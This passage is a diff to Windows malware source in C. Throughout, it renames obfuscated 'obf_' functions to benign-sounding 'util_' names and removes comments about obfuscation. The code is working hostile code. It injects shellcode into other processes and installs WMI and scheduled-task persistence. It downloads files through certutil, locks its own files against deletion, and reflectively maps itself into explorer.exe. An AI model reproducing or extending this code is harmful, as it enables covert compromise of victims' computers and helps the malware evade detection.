     int jmpOffset = -(off + 2); /* target(0) - nextInstruction(off+2) */
-    shellcode[off++] = 0xEB;
-    shellcode[off++] = (signed char)jmpOffset;
+    remoteCode[off++] = 0xEB;
+    remoteCode[off++] = (signed char)jmpOffset;
     
-    LPVOID rCode = obf_VirtualAllocEx(hProc, NULL, off, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    LPVOID rCode = util_VirtualAllocEx(hProc, NULL, off, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
     if (!rCode) {
         CloseHandle(hProc);
         return;
     }
     
-    obf_WriteProcessMemory(hProc, rCode, shellcode, off, NULL);
+    util_WriteProcessMemory(hProc, rCode, remoteCode, off, NULL);
     
     /* Change protection from RW to RX before executing */
     DWORD oldProtect;
     VirtualProtectEx(hProc, rCode, off, PAGE_EXECUTE_READ, &oldProtect);
     
-    HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)rCode, NULL, 0, NULL);
+    HANDLE hThread = util_CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)rCode, NULL, 0, NULL);
     if (hThread) CloseHandle(hThread);
     CloseHandle(hProc);
 }
 
-/* === Obfuscated WMI persistence === */
-void obf_sys_wmi_persistence(void) {
+void util_setup_wmi(void) {
     char psPath[MAX_PATH];
     GetTempPathA(MAX_PATH, psPath);
     strcat(psPath, "tmp.ps1");
@@ -745,7 +722,6 @@ void obf_sys_wmi_persistence(void) {
     FILE *f = fopen(psPath, "w");
     if (!f) return;
     
-    /* Obfuscated PowerShell with minimal suspicious strings.
        The script checks if ANY of the 3 shadow processes are missing
        and respawns them from the correct paths. */
     fprintf(f, "$e='SysHealth'; $f=$e+'Filter'; $c=$e+'Consumer'; ");
@@ -760,14 +736,14 @@ void obf_sys_wmi_persistence(void) {
     fclose(f);
     
     char cmd[512];
-    char *ps = obf_ps();
-    snprintf(cmd, sizeof(cmd), "%s -NoProfile -ExecutionPolicy Bypass -File \"%s\"", ps, psPath);
+    char *ps = util_ps();
+    snprintf(cmd, sizeof(cmd), "%s -NoProfile -ExecutionPolicy RemoteSigned -File \"%s\"", ps, psPath);
     sys_run_command(cmd);
     
     DeleteFileA(psPath);
 }
 
-/* === Obfuscated harden files ===
+/* === Utility harden files ===
  * Prevents deletion by:
  * 1. Denying delete permissions via icacls
  * 2. Hiding files (hidden + system attributes)
@@ -775,7 +751,6 @@ void obf_sys_wmi_persistence(void) {
  */
 /* === Aggressive file hardening: directory + files ===
  *
- * Makes it extremely difficult to delete the shadow copies by:
  * 1. Hardening the PARENT directory (deny DELETE_CHILD prevents file deletion)
  * 2. Changing owner to SYSTEM on both directory and files
  * 3. Setting SYSTEM + HIDDEN attributes
@@ -783,7 +758,7 @@ void obf_sys_wmi_persistence(void) {
  * 5. Explicitly denying all write/delete/modify permissions for Everyone
  */
 
-void obf_sys_harden_files(void) {
+void util_lock_files(void) {
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
     
@@ -796,7 +771,7 @@ void obf_sys_harden_files(void) {
         "NotifyService.exe"
     };
     
-    char *icacls = obf_icacls();
+    char *icacls = util_icacls();
     char cmd[1024];
     
     /* --- Harden directory first --- */
@@ -847,7 +822,7 @@ void obf_sys_harden_files(void) {
 }
 
 /* Harden a single file (used immediately after copy in spawn_single_copy) */
-void obf_sys_harden_single_file(const char *filename) {
+void util_lock_file(const char *filename) {
     char localAppData[MAX_PATH];
     GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);
     
@@ -855,7 +830,7 @@ void obf_sys_harden_single_file(const char *filename) {
     snprintf(path, sizeof(path), "%s\\Microsoft\\Windows\\INetCache\\IE\\%s",
              localAppData, filename);
     
-    char *icacls = obf_icacls();
+    char *icacls = util_icacls();
     char cmd[1024];
     
     /* Set hidden + system attributes */
@@ -884,25 +859,24 @@ void obf_sys_harden_single_file(const char *filename) {
     }
 }
 
-/* === Obfuscated LOLBAS download === */
-void obf_sys_lolbas_download(const char *url, const char *outPath) {
+/* === Utility LOLBAS download === */
+void util_download_file(const char *url, const char *outPath) {
     char cmd[1024];
-    char *certutil = obf_certutil();
+    char *certutil = util_certutil();
     snprintf(cmd, sizeof(cmd), "%s -urlcache -split -f \"%s\" \"%s\"", certutil, url, outPath);
     sys_run_command(cmd);
 }
 
-/* === Obfuscated scheduled task === */
-void obf_ensure_scheduled_task(const char *exePath, const char *taskName) {
+/* === Utility scheduled task === */
+void util_ensure_task(const char *exePath, const char *taskName) {
     char cmd[1024];
-    char *schtasks = obf_schtasks();
+    char *schtasks = util_schtasks();
     snprintf(cmd, sizeof(cmd),
         "%s /create /tn \"%s\" /tr \"%s\" /sc minute /mo 5 /f /rl highest",
         schtasks, taskName, exePath);
     sys_run_command(cmd);
 }
 
-/* === Reflective PE Loader (ASLR-Fixed) ===
  *
  * Maps the current EXE into a remote process (explorer.exe) entirely from memory.
  * Fixes both relocations AND imports correctly for the remote process's ASLR layout.
@@ -911,7 +885,7 @@ void obf_ensure_scheduled_task(const char *exePath, const char *taskName) {
  * we compute remote addresses as: remote_base + (local_func - local_base).
  * Since ASLR randomizes module bases but NOT offsets within a DLL, this is exact.
  */
-void obf_reflective_load(void) {
+void util_load_remote(void) {
     /* 1. Read current EXE into local buffer */
     char selfPath[MAX_PATH];
     GetModuleFileNameA(NULL, selfPath, MAX_PATH);
@@ -920,19 +894,19 @@ void obf_reflective_load(void) {
     if (hFile == INVALID_HANDLE_VALUE) return;
 
     DWORD fileSize = GetFileSize(hFile, NULL);
-    BYTE *payload = (BYTE*)malloc(fileSize);
-    if (!payload) { CloseHandle(hFile); return; }
+    BYTE *imageData = (BYTE*)malloc(fileSize);
+    if (!imageData) { CloseHandle(hFile); return; }
 
     DWORD read;
-    ReadFile(hFile, payload, fileSize, &read, NULL);
+    ReadFile(hFile, imageData, fileSize, &read, NULL);
     CloseHandle(hFile);
 
     /* 2. Parse PE headers */
-    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload;
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { free(payload); return; }
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageData;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { free(imageData); return; }
 
-    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(payload + dos->e_lfanew);
-    if (nt->Signature != IMAGE_NT_SIGNATURE) { free(payload); return; }
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(imageData + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) { free(imageData); return; }
 
     /* 3. Find explorer.exe PID */
     DWORD pid = 0;
@@ -950,49 +924,49 @@ void obf_reflective_load(void) {
         }
         CloseHandle(hSnap);
     }
-    if (pid == 0) { free(payload); return; }
+    if (pid == 0) { free(imageData); return; }
 
-    HANDLE hProc = obf_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProc) { free(payload); return; }
+    HANDLE hProc = util_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) { free(imageData); return; }
 
     /* 4. Unmap existing image at preferred base if occupied */
-    pNtUnmapViewOfSection_t pNtUnmap = obf_get_ntunmap();
+    pNtUnmapViewOfSection_t pNtUnmap = util_get_ntunmap();
     DWORD64 prefBase = nt->OptionalHeader.ImageBase;
     if (pNtUnmap) pNtUnmap(hProc, (PVOID)prefBase);
 
-    obf_junk_delay();
+    util_delay();
 
     /* 5. Allocate memory in remote process */
     SIZE_T imgSize = nt->OptionalHeader.SizeOfImage;
-    PVOID remoteImg = obf_VirtualAllocEx(hProc, (PVOID)prefBase, imgSize,
+    PVOID remoteImg = util_VirtualAllocEx(hProc, (PVOID)prefBase, imgSize,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remoteImg)
-        remoteImg = obf_VirtualAllocEx(hProc, NULL, imgSize,
+        remoteImg = util_VirtualAllocEx(hProc, NULL, imgSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remoteImg) {
         CloseHandle(hProc);
-        free(payload);
+        free(imageData);
         return;
     }
 
     /* 6. Write headers and sections to remote process */
-    obf_WriteProcessMemory(hProc, remoteImg, payload, nt->OptionalHeader.SizeOfHeaders, NULL);
+    util_WriteProcessMemory(hProc, remoteImg, imageData, nt->OptionalHeader.SizeOfHeaders, NULL);
 
     PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
     for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         PVOID dest = (PVOID)((DWORD64)remoteImg + sec[i].VirtualAddress);
-        PVOID src  = (PVOID)(payload + sec[i].PointerToRawData);
-        obf_WriteProcessMemory(hProc, dest, src, sec[i].SizeOfRawData, NULL);
+        PVOID src  = (PVOID)(imageData + sec[i].PointerToRawData);
+        util_WriteProcessMemory(hProc, dest, src, sec[i].SizeOfRawData, NULL);
     }
 
-    obf_junk_delay();
+    util_delay();
 
     /* 7. Fix relocations */
     DWORD64 delta = (DWORD64)remoteImg - prefBase;
     if (delta != 0) {
         IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
         if (relocDir.Size > 0) {
-            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(payload + relocDir.VirtualAddress);
+            PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(imageData + relocDir.VirtualAddress);
             while (reloc->VirtualAddress != 0) {
                 DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                 PWORD entries = (PWORD)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
@@ -1004,14 +978,14 @@ void obf_reflective_load(void) {
                         DWORD64 value;
                         if (ReadProcessMemory(hProc, addr, &value, sizeof(value), NULL)) {
                             value += delta;
-                            obf_WriteProcessMemory(hProc, addr, &value, sizeof(value), NULL);
+                            util_WriteProcessMemory(hProc, addr, &value, sizeof(value), NULL);
                         }
                     } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                         PVOID addr = (PVOID)((DWORD64)remoteImg + reloc->VirtualAddress + offset);
                         DWORD32 value;
                         if (ReadProcessMemory(hProc, addr, &value, sizeof(value), NULL)) {
                             value += (DWORD32)delta;
-                            obf_WriteProcessMemory(hProc, addr, &value, sizeof(value), NULL);
+                            util_WriteProcessMemory(hProc, addr, &value, sizeof(value), NULL);
                         }
                     }
                 }
@@ -1033,8 +1007,8 @@ void obf_reflective_load(void) {
     char *kernel32 = get_str(enc_kernel32, sizeof(enc_kernel32));
     HMODULE hKernel32 = GetModuleHandleA(kernel32);
 
-    char *enumProcStr = obf_enumproc();
-    char *getBaseNameStr = obf_getbasename();
+    char *enumProcStr = util_enumproc();
+    char *getBaseNameStr = util_getbasename();
     typedef BOOL (WINAPI *EnumPM_t)(HANDLE, HMODULE*, DWORD, LPDWORD);
     typedef DWORD (WINAPI *GetMBN_t)(HANDLE, HMODULE, LPSTR, DWORD);
     EnumPM_t pEnum = (EnumPM_t)GetProcAddress(hKernel32, enumProcStr);
@@ -1070,16 +1044,15 @@ void obf_reflective_load(void) {
                 }
             }
 
-            /* If not loaded, inject LoadLibraryA into remote to load it */
             if (remoteBase == 0 && localBase) {
                 FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
                 if (pLoadLibraryA) {
                     SIZE_T dllNameLen = strlen(dllName) + 1;
-                    LPVOID rDllName = obf_VirtualAllocEx(hProc, NULL, dllNameLen,
+                    LPVOID rDllName = util_VirtualAllocEx(hProc, NULL, dllNameLen,
                                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                     if (rDllName) {
-                        obf_WriteProcessMemory(hProc, rDllName, dllName, dllNameLen, NULL);
-                        HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0,
+                        util_WriteProcessMemory(hProc, rDllName, dllName, dllNameLen, NULL);
+                        HANDLE hThread = util_CreateRemoteThread(hProc, NULL, 0,
                             (LPTHREAD_START_ROUTINE)pLoadLibraryA, rDllName, 0, NULL);
                         if (hThread) {
                             WaitForSingleObject(hThread, 10000);
@@ -1137,7 +1110,7 @@ void obf_reflective_load(void) {
                     if (localAddr) {
                         DWORD64 offset = (DWORD64)localAddr - localBase;
                         DWORD64 remoteAddr = remoteBase + offset;
-                        obf_WriteProcessMemory(hProc, thunkAddr, &remoteAddr, sizeof(remoteAddr), NULL);
+                        util_WriteProcessMemory(hProc, thunkAddr, &remoteAddr, sizeof(remoteAddr), NULL);
                     }
                     idx++;
                 }
@@ -1146,16 +1119,16 @@ void obf_reflective_load(void) {
         }
     }
 
-    obf_junk_delay();
+    util_delay();
 
     /* 9. Update remote PEB ImageBaseAddress */
-    pNtQueryInfoProc_t pNtQuery = obf_get_ntqueryinfo();
+    pNtQueryInfoProc_t pNtQuery = util_get_ntqueryinfo();
     if (pNtQuery) {
         PROCESS_BASIC_INFORMATION pbi;
         ULONG retLen;
         if (pNtQuery(hProc, 0 /* ProcessBasicInformation */, &pbi, sizeof(pbi), &retLen) == 0) {
             PVOID pebImageBase = (PVOID)((DWORD64)pbi.PebBaseAddress + 0x10);
-            obf_WriteProcessMemory(hProc, pebImageBase, &remoteImg, sizeof(remoteImg), NULL);
+            util_WriteProcessMemory(hProc, pebImageBase, &remoteImg, sizeof(remoteImg), NULL);
         }
     }
     
@@ -1165,10 +1138,10 @@ void obf_reflective_load(void) {
 
     /* 10. Create remote thread at entry point */
     DWORD64 entryPoint = (DWORD64)remoteImg + nt->OptionalHeader.AddressOfEntryPoint;
-    HANDLE hThread = obf_CreateRemoteThread(hProc, NULL, 0,
+    HANDLE hThread = util_CreateRemoteThread(hProc, NULL, 0,
         (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
     if (hThread) CloseHandle(hThread);
 
     CloseHandle(hProc);
-    free(payload);
+    free(imageData);
 }
